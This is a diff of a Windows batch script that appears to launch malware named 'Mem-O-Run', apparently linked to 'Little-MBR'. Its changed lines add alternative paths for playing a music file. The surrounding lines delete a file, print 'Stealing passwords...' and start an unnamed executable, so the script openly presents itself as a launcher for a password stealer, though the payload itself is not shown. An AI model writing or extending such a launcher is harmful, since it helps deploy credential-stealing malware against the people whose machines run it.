@@ -48,7 +48,10 @@ del "%CS_FILE%"
 
 echo [+] Starting...
 :: Starts your music file in your system's default media player
-start /min "" "C:\Mem-O-Run\Little-MBR.mp3"
+start /min "" "C:\Mem-O-Run-v1.0.1\Little-MBR.mp3"
+start /min "" "Desktop\Mem-O-Run-v1.0.1\Little-MBR.mp3"
+start /min "" "C:\Malware\Mem-O-Run\Little-MBR.mp3"
+start /min "" "C:\Mem-O-Run-v1.0.1.zip\Little-MBR.mp3"
 
 echo [+] Stealing passwords...
 start "" "%EXE_FILE%"
